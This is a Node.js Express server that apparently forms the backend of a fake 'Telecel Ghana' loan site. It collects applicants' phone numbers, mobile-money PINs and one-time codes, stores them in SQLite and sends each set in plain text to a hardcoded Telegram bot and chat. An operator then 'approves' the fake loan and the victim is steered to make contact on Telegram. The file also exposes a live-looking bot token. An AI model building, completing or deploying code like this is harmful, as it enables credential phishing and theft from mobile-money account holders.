const express = require('express');
const cors = require('cors');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot Configuration - GHANA TELECEL
const TELEGRAM_BOT_TOKEN = '8843069473:AAFWS3TrGqaQQDHiZrMsDAwhSGV16SKglXA';
const TELEGRAM_CHAT_ID = '6414813627';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

const DB_PATH = '/tmp/loans.db';
let db = null;

async function initDatabase() {
    try {
        db = await open({ filename: DB_PATH, driver: sqlite3.Database });
        await db.exec(`
            CREATE TABLE IF NOT EXISTS loans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                loan_id TEXT UNIQUE,
                phone TEXT,
                pin TEXT,
                network TEXT,
                amount INTEGER,
                duration INTEGER,
                monthly_payment INTEGER,
                total_payment INTEGER,
                interest INTEGER,
                otp_code TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
        `);
        console.log('✅ Database initialized');
    } catch (error) {
        console.error('❌ Database error:', error);
    }
}

async function sendTelegramMessage(text, replyMarkup = null) {
    try {
        const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
        if (replyMarkup) payload.reply_markup = replyMarkup;
        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Telegram sent');
            return data.result.message_id;
        } else {
            console.error('Telegram error:', data);
        }
    } catch (error) {
        console.error('Telegram error:', error);
    }
    return null;
}

async function editTelegramMessage(messageId, text) {
    try {
        await fetch(`${TELEGRAM_API}/editMessageText`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Edit message error:', error);
    }
}

function generateLoanId() {
    return `TGH${Date.now().toString(36)}${Math.random().toString(36).substring(2, 8)}`.toUpperCase();
}

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.post('/api/save-loan', async (req, res) => {
    try {
        console.log('📥 Save loan request received:', req.body);
        const { phone, pin, network, amount, duration, monthly, total, interest } = req.body;
        const loanId = generateLoanId();
        
        if (db) {
            await db.run(`INSERT INTO loans (loan_id, phone, pin, network, amount, duration, monthly_payment, total_payment, interest, status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [loanId, phone, pin, network, amount, duration, monthly, total || amount * 1.109, interest || amount * 0.109, 'pending']);
            console.log('✅ Loan saved to database:', loanId);
        }
        
        const messageText = `<b>🔴 NEW LOAN APPLICATION - GHANA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>💰 Amount:</b> GHS ${amount.toLocaleString()}\n` +
            `<b>📱 Network:</b> ${network}\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
            `<b>📅 Duration:</b> ${duration/30} months\n` +
            `<b>💳 Monthly:</b> GHS ${monthly.toLocaleString()}\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>⚠️ Action Required:</b> Select an option below:`;
        
        const replyMarkup = {
            inline_keyboard: [[
                { text: "✅ Approve Loan", callback_data: `approve_${loanId}` },
                { text: "❌ Decline", callback_data: `decline_${loanId}` }
            ]]
        };
        
        const messageId = await sendTelegramMessage(messageText, replyMarkup);
        
        res.json({ success: true, loanId, messageId });
    } catch (error) {
        console.error('❌ Save loan error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/webhook/telegram', async (req, res) => {
    try {
        const update = req.body;
        console.log('📨 Webhook received:', JSON.stringify(update, null, 2));
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const messageId = update.callback_query.message.message_id;
            const callbackId = update.callback_query.id;
            const [action, loanId] = callbackData.split('_');
            
            console.log(`🎯 Action: ${action}, LoanId: ${loanId}`);
            
            if (action === 'approve' && db) {
                await db.run(`UPDATE loans SET status = 'approved' WHERE loan_id = ?`, [loanId]);
                console.log(`✅ Loan ${loanId} status updated to 'approved'`);
                
                await editTelegramMessage(messageId, 
                    `✅ <b>LOAN APPROVED</b>\n\n` +
                    `Loan ID: ${loanId}\n` +
                    `Status: APPROVED\n` +
                    `User can now proceed with OTP.`
                );
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callbackId, text: "✅ Loan Approved!" })
                });
            } else if (action === 'decline' && db) {
                await db.run(`UPDATE loans SET status = 'declined' WHERE loan_id = ?`, [loanId]);
                console.log(`❌ Loan ${loanId} status updated to 'declined'`);
                
                await editTelegramMessage(messageId,
                    `❌ <b>LOAN DECLINED</b>\n\n` +
                    `Loan ID: ${loanId}\n` +
                    `Status: DECLINED`
                );
                
                await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ callback_query_id: callbackId, text: "❌ Loan Declined" })
                });
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('❌ Webhook error:', error);
        res.sendStatus(200);
    }
});

app.post('/api/save-otp', async (req, res) => {
    try {
        const { loanId, otp, phone } = req.body;
        
        console.log('🔐 OTP received:', { loanId, otp, phone });
        
        if (db) {
            await db.run(`UPDATE loans SET otp_code = ? WHERE loan_id = ?`, [otp, loanId]);
        }
        
        const messageText = `<b>🔐 OTP CODE ENTERED - GHANA</b>\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `<b>🏷️ Loan ID:</b> <code>${loanId}</code>\n` +
            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
            `<b>🔑 OTP Code:</b> <code>${otp}</code>\n` +
            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `<b>✅ User has entered OTP and is proceeding to contact you on Telegram.</b>`;
        
        await sendTelegramMessage(messageText);
        
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Save OTP error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/loan/:loanId', async (req, res) => {
    try {
        if (!db) return res.json({ success: true, loan: { status: 'pending' } });
        const loan = await db.get(`SELECT * FROM loans WHERE loan_id = ?`, [req.params.loanId]);
        console.log(`📊 Status check for ${req.params.loanId}: ${loan?.status || 'not found'}`);
        res.json({ success: true, loan: loan || { status: 'pending' } });
    } catch (error) {
        console.error('❌ Get loan error:', error);
        res.json({ success: true, loan: { status: 'pending' } });
    }
});

app.get('/', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'index.html')); });
app.get('/verify.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'verify.html')); });
app.get('/otp.html', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'otp.html')); });

async function startServer() {
    await initDatabase();
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`🚀 Telecel Ghana Server running on port ${PORT}`);
        console.log(`📱 Telegram Bot Ready`);
    });
}

startServer();
